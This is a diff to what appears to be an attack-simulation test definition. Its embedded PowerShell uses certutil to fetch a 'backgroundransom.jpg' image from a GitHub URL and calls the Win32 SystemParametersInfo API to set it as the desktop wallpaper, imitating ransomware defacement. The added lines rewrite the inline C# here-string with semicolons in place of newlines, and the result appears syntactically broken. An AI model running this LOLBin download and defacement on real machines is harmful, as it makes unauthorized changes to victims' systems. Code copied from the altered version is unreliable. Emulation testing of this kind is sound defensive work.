@@ -10,12 +10,12 @@
       $DownloadURL=\"https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg\"\
       ;\n$CompleteCommand= \"certutil -urlcache -f \"+\" $DownloadURL\"+\" $DestinationFile\"\
       ;\nInvoke-Expression  $CompleteCommand | Out-File \"$Exf_File\";\n$MyWallpaper=\"\
-      $DestinationFile\";\n\n$code = @' \nusing System.Runtime.InteropServices; \n\
-      namespace Win32{ \n    \n     public class Wallpaper{ \n        [DllImport(\"\
-      user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo\
-      \ (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n\
-      \         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);\
-      \ \n         }\n    }\n } \n'@;\nadd-type $code; \n\n[Win32.Wallpaper]::SetWallpaper($MyWallpaper);"
+      $DestinationFile\";\n\n$code = @' ; using System.Runtime.InteropServices; namespace\
+      \ Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\
+      \ ;          static extern int SystemParametersInfo (int uAction , int uParam\
+      \ , string lpvParam , int fuWinIni) ;          ;          public static void\
+      \ SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);\
+      \         };     }; } ; '@;\n\nadd-type $code; \n\n[Win32.Wallpaper]::SetWallpaper($MyWallpaper);"
     variations: []
     build_target: null
     cleanup: []
